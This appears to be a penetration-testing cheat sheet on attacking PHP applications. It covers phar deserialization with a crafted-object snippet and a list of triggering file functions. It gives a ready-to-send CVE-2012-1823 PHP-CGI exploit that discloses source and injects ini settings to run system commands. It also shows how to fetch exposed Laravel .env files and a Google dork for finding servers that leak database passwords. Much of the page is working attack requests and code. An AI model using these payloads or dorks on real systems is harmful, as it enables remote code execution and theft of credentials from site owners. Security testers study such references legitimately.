PHP
===


## Deserialization

### Phar deserialization
The unserialization of a `phar` wrapper is realized in any file operation. Thus,
file operation such as `file_exists` might be less protected, then it's possible
to inject a `phar` wrapper within it.

The following code describes how to create a `phar` wrapper:

```php
<?php

require('weak_class.php');
# We craft an object by overwriting some methods and functions
$obj = new WeakClass();
$obj->args = "id";

# Then, we serialize the object to a file
file_put_contents("/tmp/exploit.phar", serialize($obj));
```

Here is an example of exploitable functions:

```
copy
file_exists
file_get_contents
file_put_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
fopen
is_dir
is_executable
is_file
is_link
is_readable
is_writable
lstat
mkdir
parse_ini_file
readfile
rename
rmdir
stat
touch
unlink
```


## CVE-2012-1823: RCE in PHP-CGI

PHP-CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection.

You can show the page source code:
```
GET https://<host>/file.php?-s
```

Or even execute PHP scripts (or a remote code execution)
```
POST https://<host>/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input

<?php system('whoami'); ?>
```

More details can be found on the Metasploit script [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/php_cgi_arg_injection.rb)



## Laravel configuration file

The Laravel configuration file is sometimes exposed on the Internet with a dotEnv
file at the root level of the web server:

```
https://<host>/.env
```

You can find vulnerable target using a Google dork:

```
"DB_PASSWORD" filetype:env
```
